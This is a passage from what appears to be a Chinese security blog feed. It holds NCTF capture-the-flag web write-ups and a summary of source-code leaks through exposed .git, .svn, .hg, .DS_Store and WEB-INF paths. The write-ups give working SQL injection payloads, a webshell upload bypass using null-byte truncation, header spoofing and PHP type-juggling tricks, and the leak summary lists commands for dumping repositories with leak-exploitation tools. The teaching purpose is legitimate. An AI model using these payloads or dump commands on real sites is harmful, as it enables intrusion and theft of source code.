title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h4><p><a href="http://way.nuptzj.cn/php/index.txt" target="_blank" rel="noopener">http://way.nuptzj.cn/php/index.txt</a>看到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>id的内容要跟hackerDJ不相同，但是urldecode之后要和hackerDJ相同</p><p>其实在此处考察的是$_GET[]本身就有urldecode的功能，所以构造：%2568ackerDJ即可</p><p>nctf{php_is_best_language}</p><h4 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h4><p>看到这句“管理系统只能在本地登陆”就知道了</p><p>抓包增加：X-Forwarded-For: 127.0.0.1</p><p>nctf{happy_http_headers}</p><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>flag在响应头中，用burp看下就行</p><p>nctf{tips_often_hide_here}</p><h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>这题网上大多都写错了，有必要一写。</p><p>首先我们上传1.png（但实际文件内容写的是php一句话）</p><p>上传成功，我们可以知道与文件内容无关。重要的是：最终路径是拼接了 dir 和 filename 的，那么我们在 dir 处 00 截断为 .php 即可绕过。</p><p>具体的方式为用burp在hex中将空格20修改为00</p><p>nctf{welcome_to_hacks_world}</p><h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>知道了是post注入之后我们看代码就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>trim()是去除两侧空格，重点在于依据下面这句进行构造</p><p>$sql=”select user from ctf where (user=’”.$user.”‘) and (pw=’”.$pass.”‘)”;</p><p>构造：admin’)#即可， ‘)用来分别用来闭合 #用来把后面给注释掉</p><p>nctf{ni_ye_hui_sql?}</p><h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h4><p>来继续审计：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass=@$_POST[&apos;pass&apos;];</span><br><span class="line">$pass1=***********;//被隐藏起来的密码</span><br><span class="line">if(isset($pass))</span><br><span class="line">&#123;</span><br><span class="line">if(@!strcmp($pass,$pass1))&#123;</span><br><span class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;the pass is wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;please input pass!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strcmp() 函数比较两个字符串。依据提示我们需要构造pass与pass1相等才行，但是我又不知道pass1，但是strcmp()比较，若相等返回0！但是null和0是等价的，所以我们让其返回null即可。构造：pass[]=hack 把这个post上去就行</p><p>flag:nctf{strcmp_is_n0t_3afe}</p><h4 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">        $one = ord(&apos;1&apos;);//ord() 函数返回字符串的首个字符的 ASCII 值。</span><br><span class="line">        $nine = ord(&apos;9&apos;);</span><br><span class="line">        for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           return $number == &apos;54975581388&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$flag=&apos;*******&apos;;</span><br><span class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</span><br><span class="line">    echo $flag;</span><br><span class="line">else </span><br><span class="line">    echo &apos;access denied&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>要求：id中的字符串不能有数字，而想得到flag又要进去的是要数字</p><p>构造：54975581388的16进制 0xccccccccc</p><p>提交得到flag:nctf{follow_your_dream}</p><h4 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h4><p>其中涉及了URL编码和base64编码，burp抓包修改成admin就行</p><p>nctf{reset_password_often_have_vuln}</p><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title=".php反序列化"></a>.php反序列化</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</span><br><span class="line">    $pass = $_GET[&apos;pass&apos;];</span><br><span class="line"></span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">        if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</span><br><span class="line">        else </span><br><span class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else echo &quot;are you trolling?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目的意思就是一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用a=&amp;b</p><p>（这可以当成一个专题讲讲）</p><p>1.php的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line"></span><br><span class="line">class just4fun &#123;  </span><br><span class="line"></span><br><span class="line">    var $enter;  </span><br><span class="line"></span><br><span class="line">    var $secret;  </span><br><span class="line"></span><br><span class="line">    function just4fun()  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        $this-&gt;enter=&amp;$this-&gt;secret;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">echo serialize(new just4fun());  </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop php 1.php</span><br><span class="line"></span><br><span class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>构造：</p><p><a href="http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}" target="_blank" rel="noopener">http://115.28.150.176/php1/index.php?pass=O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}</a></p><p>得到flag</p><p>nctf{serialize_and_unserialize}</p><h4 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">if(get_magic_quotes_gpc())&#123;//当 magic_quotes_gpc 打开时，所有的 ’ (单引号), ” (双引号),                   \ (反斜线) and 空字符会自动转为含有反斜线的转义字符</span><br><span class="line">$str=stripslashes($str);//与stripslashes()搭配使用，此函数是删除所有的\的 </span><br><span class="line">&#125;</span><br><span class="line">return htmlentities($str, ENT_QUOTES);//htmlentities($str, ENT_QUOTES)是指编码所有的双引号和单引号</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>重点在于：</p><p>在这里由于’被转编码，所以可以使用\转义</p><p><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></p><p>构造：<code>http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password=%20or%201%23</code></p><p>插入后大致的sql语句为：<code>SELECT * FROM users WHERE name=’ admin\’ AND pass=’ or 1#’;</code></p><h4 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h4><p>zh个很有意思，首先是一个jsfuck，不用解码，直接执行就可以</p><p>执行后得到：1bc29b36f623ba82aaf6724fd3b16718.php</p><p>打开发现不是这回事</p><p>又看提示，想到bash的一些相关，再看这个网页的header发现tip “history of bash”</p><p>bash_history是用来存放历史记录的，所以我们就访问</p><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p><p>又得到提示：zip -r flagbak.zip ./*</p><p>那么就访问这个：</p><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p><p>下载解压得到flag is:nctf{bash_history_means_what}</p><h4 id="有源码"><a href="#有源码" class="headerlink" title="有源码"></a>有源码</h4><p>给了题目的源码，可以自己搭建环境来尝试</p><p><a href="https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB" target="_blank" rel="noopener">https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB</a></p><h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strcasecmp是不分大小比较，这样只要得到密码md5值相同即可，提示已经说了用union所以我们来构造payload：</p><p>username填写’ union select md5(1)#</p><p>password填写1</p><p>得flag：ntcf{union_select_is_wtf}</p><p>剩余的题目不建议小白来做，想做的看这个链接</p><p><a href="http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9" target="_blank" rel="noopener">http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9</a></p><p>或者：</p><p><a href="https://www.40huo.cn/blog/nctf-writeup.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/nctf-writeup.html</a></p><p>（ps：东西太多写不动了。。。）</p><p>总结：可以写点base64、base32、url编码解码、文本与16进制转换的小工具。&lt;&lt;&lt;可以练手，但是hackbar带全了和burp</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h4&gt;&lt;p&gt;nctf{flag_admiaanaaaaaaaaaaa}&lt;/p&gt;
&lt;h4 id=&quot;php的弱类型加MD5碰撞&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>常见Web源码泄露总结</title>
    <link href="http://zer0yu.github.io/2017/01/25/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/"/>
    <id>http://zer0yu.github.io/2017/01/25/常见Web源码泄露总结/</id>
    <published>2017-01-25T02:50:24.000Z</published>
    <updated>2017-02-04T01:12:53.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p><h3 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h3><h4 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h4><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>hg init的时候会生成.hg</p><p>e.g.<a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p><h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure><h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h4><h5 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>e.g. <a href="http://www.example.com/.git/config" target="_blank" rel="noopener">http://www.example.com/.git/config</a></p><h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>工具：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.example.com/.git/</span><br></pre></td></tr></table></figure><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-git.pl -v -u http://www.example.com/.git/</span><br></pre></td></tr></table></figure><h4 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h4><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h5><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p><a href="http://www.example.com/.ds_store" target="_blank" rel="noopener">http://www.example.com/.ds_store</a></p><p>注意路径检查</p><p>网站备份压缩文件</p><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p>工具：</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><h5 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害:"></a>漏洞成因及危害:</h5><p>该漏洞的成因主要有以下两种：</p><ol><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ol><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line"></span><br><span class="line">.zip</span><br><span class="line"></span><br><span class="line">.7z</span><br><span class="line"></span><br><span class="line">.tar.gz</span><br><span class="line"></span><br><span class="line">.bak</span><br><span class="line"></span><br><span class="line">.swp</span><br><span class="line"></span><br><span class="line">.txt</span><br><span class="line"></span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name <span class="string">".DS_Store"</span> -print0 | xargs -0 rm -rf <span class="comment">#递归删除".DS_Store"文件</span></span><br></pre></td></tr></table></figure><h4 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h4><h5 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h5><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><p>e.g.<a href="http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries" target="_blank" rel="noopener">http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</a></p><h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1mrNpB" target="_blank" rel="noopener">Seay-Svn</a></p><h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h4><h5 id="简介：-1"><a href="#简介：-1" class="headerlink" title="简介："></a>简介：</h5><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要包含一下文件或目录：</p><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件</p><h5 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><h5 id="漏洞检测以及利用方法："><a href="#漏洞检测以及利用方法：" class="headerlink" title="漏洞检测以及利用方法："></a>漏洞检测以及利用方法：</h5><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p><h4 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h4><h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>测试的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><p>取回源码的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure><p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p><p>查看所有的改变的命令，转到download的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br></pre></td></tr></table></figure><h4 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h4><h5 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure><h3 id="神器"><a href="#神器" class="headerlink" title="神器"></a>神器</h3><p><a href="[http://www.bitkeeper.com/installation.instructions](http://www.bitkeeper.com/installation.instructions">Bitkeeper</a>)</p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">weakfilescan</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0" target="_blank" 